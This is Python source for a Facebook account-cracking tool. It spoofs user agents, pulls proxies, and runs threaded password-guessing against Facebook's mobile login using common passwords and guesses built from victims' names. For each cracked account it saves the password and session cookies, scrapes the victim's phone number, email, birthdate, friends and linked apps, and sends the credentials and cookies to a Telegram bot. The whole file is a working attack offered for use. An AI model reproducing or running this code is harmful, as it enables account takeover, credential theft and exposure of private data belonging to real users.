    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 1…',
    '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36']
ugen2 = [
    'Mozilla/5.0 (Linux; U; Android 7.0; es-us; 7.0; Redmi Note 4 Build/NRD90M)L659B) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4773.134 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2Mozilla/5.0 (Linux; U; Android 7.0; es-us; 12; Redmi Note 4 Build/NRD90M)G813D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4860.149 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2']
ugen = [
    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64T449V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4571.73 Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-K580T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4806.44 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-L592D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4228.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 9;  en-us; GT-Y602C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4870.41 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 6;  en-us; GT-O209S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4789.51 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-E525L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4572.143 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-Q191U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4775.146 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 8;  en-us; GT-U702Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4514.138 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android  7.0; Mi 4i Build//L87A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4926.314 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android  5.0; xiaomi 6 Build/I105N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.3401.235 Mobile Safari/537.36']
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
except:
    print('𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺')
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android'
    b = random.choice([
        '2',
        '3',
        '4',
        '5',
        '5.2',
        '6',
        '6.0.1',
        '7',
        '8',
        '9',
        '10',
        '11',
        '11',
        '11.0.1',
        '12',
        '13'])
    c = random.choice([
        'OPPO A57 Build/MMB29M; wv'])
    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e = random.randrange(80, 106)
    f = '0'
    g = random.randrange(3904, 5000)
    h = random.randrange(40, 100)
    i = 'MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
    uaku2 = f'''{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'''
    ugen.append(uaku2)
for x in range(10):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
L = '\x1b[0;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
asu = random.choice([
    m,
    k,
    h,
    u,
    b])
dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
M = '\x1b[1;91m'
O = '\x1b[1;96m'
N = '\x1b[0m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
def clear():
    os.system('clear')


def SDMVIP():
    ip = requests.get('https://api.ipify.org').text
    gep = requests.get('http://ipinfo.io/json').json()
    os.system('clear')
    print(L + SDMi)
    print(L + '====================================')
    print('')
    _____yasir_____ = '1'
    if _____yasir_____ in ('1',):
        SD_SDMVIP()


def yasir():
    try:
        na = webbrowser.open('https://t.me/PR_7N')
    except:
        exit()



def SD_SDMVIP():
    
    try:
        print('')
        fileX = input(f'''{L}Name File {M}:{H} ''')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
        clear()
        print(M + logo)
        print(L + '✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
        print(f'''>> ID : {h}''' + str(len(id)))
        time.sleep(3)
    except:
        exit(f'''\n{M}File %s not found''' % fileX)



def setting():
    hu = '1'
    if hu in ('3', '03'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('1', '01'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print('>> PILIH YANG BENAR BANG ')
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        print('>> PILIH YANG BENAR BANG ')
        setting()
    _jembot_ = '2'
    if _jembot_ in ('',):
        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ('2', '2'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = '1'
    if pwplus in ('2', '2'):
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[green]] يمكنك وضع باسورد واحد فقط\n[[cyan]•[green]] Contoh :[green] 123456qwerty[green] '))
        pwku = input('>>ادخل الباسورد : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
        passwrd()


def passwrd():
   
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append('qqwweerr')
					pwv.append('aaaassss')
					pwv.append('zzzzxxxx')
					pwv.append('07700770')
					pwv.append('07800780')
					pwv.append('Mohamed2005')
					pwv.append('11223344556677')
					pwv.append('nnnnmmmm')
					pwv.append('mmmmnnnn')
					pwv.append('00998877')
					pwv.append('12345qwert')
					pwv.append('qqwweerrtt')
					pwv.append('zzxxccvv')
					pwv.append('zxcvzxcv')
					pwv.append('19901990')
					pwv.append('19911991')
					pwv.append('19921992')
					pwv.append('19931993')
					pwv.append('19941994')
					pwv.append('19951995')
					pwv.append('19961996')
					pwv.append('19971997')
					pwv.append('19981998')
					pwv.append('19991999')
					pwv.append('20012001')
					pwv.append('20052005')
					pwv.append('20062006')
					pwv.append('20072007')
					pwv.append('1122334455@@')
					pwv.append('1q2w3e4r5t6y')
					pwv.append('1q2w3e4r5t')
					pwv.append('1122334455')
					pwv.append('112233445566')
					pwv.append('ppooiiuu')
					pwv.append('qqwweerr')
					pwv.append('qqwweerr@@')
					pwv.append('ppooiiuu@@')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('qqwweerr')
					pwv.append('aaaassss')
					pwv.append('zzzzxxxx')
					pwv.append('07700770')
					pwv.append('07800780')
					pwv.append('Mohamed2005')
					pwv.append('11223344556677')
					pwv.append('nnnnmmmm')
					pwv.append('mmmmnnnn')
					pwv.append('00998877')
					pwv.append('12345qwert')
					pwv.append('qqwweerrtt')
					pwv.append('zzxxccvv')
					pwv.append('zxcvzxcv')
					pwv.append('19901990')
					pwv.append('19911991')
					pwv.append('19921992')
					pwv.append('19931993')
					pwv.append('19941994')
					pwv.append('19951995')
					pwv.append('19961996')
					pwv.append('19971997')
					pwv.append('19981998')
					pwv.append('19991999')
					pwv.append('20012001')
					pwv.append('20052005')
					pwv.append('20062006')
					pwv.append('20072007')
					pwv.append('1122334455@@')
					pwv.append('1q2w3e4r5t6y')
					pwv.append('1q2w3e4r5t')
					pwv.append('1122334455')
					pwv.append('112233445566')
					pwv.append('ppooiiuu')
					pwv.append('qqwweerr')
					pwv.append('qqwweerr@@')
					pwv.append('ppooiiuu@@')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'api' in method:
				pool.submit(crack2,idf,pwv)
			elif 'free' in method:
				pool.submit(crack3,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	os.system('clear')
	cetak(nel('\t[cyan]✓[green] The hunt is complete, thank you[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x}  '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ?')
	woi = input(f'>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}<>{k} Good Bye {x} <> ')
		time.sleep(2)
		back() 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	rc = random.choice
	amr = rc(['😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '😚', '😙','😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', '😏', '😒', '🙄', '😬','🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', '🤯', '🤠','🥳', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭','😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾','🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕','💞', '💓', '💗', '💖', '💘', '💝', '💟', '❤️‍🔥', '❤️‍🩹', '❤️','🚀', '🛸', '🌍', '🌎', '🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬'])
	sys.stdout.write(f"\r{bo}({amr}🔱 نمــࢪود 🔱𖤤) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''• DeCoDe By @H_S_W_M •
					▄︻デ══━一 «𝗖𝗣❌  سڪيوࢪ ࿐» ⏎
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
 (♕) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
 

(♕) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 :{pw}
 
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
• DeCoDe By @H_S_W_M •
(♕) 🔱 نمــࢪود 🔱 𖣬 :『@M_T_F 』⏎
					'''
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'''• DeCoDe By @H_S_W_M •\n▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ \n:{kuki}
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
• DeCoDe By @H_S_W_M •
\n(♕) 🔱 نمــࢪود 🔱 𖣬 \n:『@M_T_F 』⏎'\n\n\t\t\t\t\t
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					cek_SDMVIP(kuki)
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''• DeCoDe By @H_S_W_M •\n▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ \n:{kuki}
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
• DeCoDe By @H_S_W_M •
\n(♕) 🔱 نمــࢪود 🔱 𖣬 \n:『@M_T_F 』⏎'''
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''• DeCoDe By @H_S_W_M •\n▄︻デ══━一 «𝗢𝗞✅ شـغال ࿐» ⏎
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
 (𝑆𝐷𝑀) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
 
(𝑆𝐷𝑀) જ⁀➴  - 𝗣𝗔𝗦𝗦 ッ  :{pw}

(𝑆𝐷𝑀) જ⁀➴  - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ :{kuki}
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
• DeCoDe By @H_S_W_M •
(♕) 🔱 نمــࢪود 🔱 𖣬 :『@M_T_F 』⏎'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					cek_SDMVIP(kuki)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def cek_SDMVIP(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
